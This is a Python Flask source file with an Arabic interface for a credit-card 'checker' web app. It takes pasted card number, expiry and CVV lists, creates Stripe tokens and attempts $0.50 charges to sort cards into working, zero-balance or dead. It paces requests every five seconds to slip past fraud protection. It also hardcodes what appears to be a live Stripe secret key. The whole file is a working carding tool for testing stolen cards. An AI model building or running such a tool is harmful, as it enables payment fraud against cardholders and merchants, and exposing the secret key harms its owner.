import stripe
import time
import os
from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)

# --- بياناتك الخاصة ---
stripe.api_key = "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"

# --- تصميم الصفحة (HTML + CSS) ---
HTML_PAGE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>LYNIX PRECISION CHECKER</title>
    <style>
        body { font-family: sans-serif; background: #121212; color: white; text-align: center; padding: 20px; }
        textarea { width: 80%; height: 200px; background: #1e1e1e; color: #00ff00; border: 1px solid #333; padding: 10px; border-radius: 5px; }
        button { background: #007bff; color: white; border: none; padding: 10px 30px; cursor: pointer; border-radius: 5px; margin-top: 10px; font-size: 18px; }
        #results { margin-top: 20px; text-align: left; display: inline-block; width: 80%; }
        .hit { color: #00ff00; border-bottom: 1px solid #222; padding: 5px; }
        .live { color: #ffff00; border-bottom: 1px solid #222; padding: 5px; }
        .dead { color: #ff4444; border-bottom: 1px solid #222; padding: 5px; }
    </style>
</head>
<body>
    <h1>🎯 محرك الفحص الدقيق V3</h1>
    <p>أدخل البطاقات هنا (التنسيق: CARD|MM|YY|CVV)</p>
    <textarea id="cardList" placeholder="4444555566667777|12|26|000"></textarea><br>
    <button onclick="startCheck()">بدء الفحص (فاصل 5 ثوانٍ)</button>
    <div id="status"></div>
    <div id="results"></div>

    <script>
        async function startCheck() {
            const list = document.getElementById('cardList').value.split('\\n');
            const resDiv = document.getElementById('results');
            const status = document.getElementById('status');
            resDiv.innerHTML = '';
            
            for (let i = 0; i < list.length; i++) {
                const card = list[i].trim();
                if (!card) continue;
                
                status.innerText = `جاري فحص: ${i+1} من أصل ${list.length}...`;
                
                try {
                    const response = await fetch('/check', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({card: card})
                    });
                    const data = await response.json();
                    
                    const p = document.createElement('div');
                    p.className = data.status.toLowerCase();
                    p.innerText = `[${data.status}] ${card} - ${data.msg}`;
                    resDiv.prepend(p);
                } catch (e) { console.error(e); }
                
                if (i < list.length - 1) {
                    status.innerText += " (انتظار 5 ثوانٍ لنظام الحماية...)";
                    await new Promise(r => setTimeout(r, 5000));
                }
            }
            status.innerText = "🏁 اكتمل الفحص!";
        }
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_PAGE)

@app.route('/check', methods=['POST'])
def check():
    data = request.json
    card_str = data.get('card', '')
    try:
        num, mm, yy, cvc = card_str.replace(" ", "").split('|')
        
        # إنشاء توكن للفحص
        token = stripe.Token.create(
            card={"number": num, "exp_month": int(mm), "exp_year": int(yy), "cvc": cvc}
        )
        # محاولة سحب 0.50$
        stripe.Charge.create(
            amount=50, currency="usd", source=token.id, description="Web Checker Verify"
        )
        return jsonify({"status": "HIT", "msg": "بطاقة شغالة وبها رصيد!"})

    except stripe.error.CardError as e:
        err = e.json_body.get('error', {})
        code = err.get('code', '')
        if code == "insufficient_funds":
            return jsonify({"status": "LIVE", "msg": "شغالة لكن الرصيد صفر."})
        return jsonify({"status": "DEAD", "msg": err.get('message')})
    except Exception as e:
        return jsonify({"status": "ERROR", "msg": "خطأ في التنسيق"})

if __name__ == "__main__":
    # Render يطلب المنفذ 10000
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
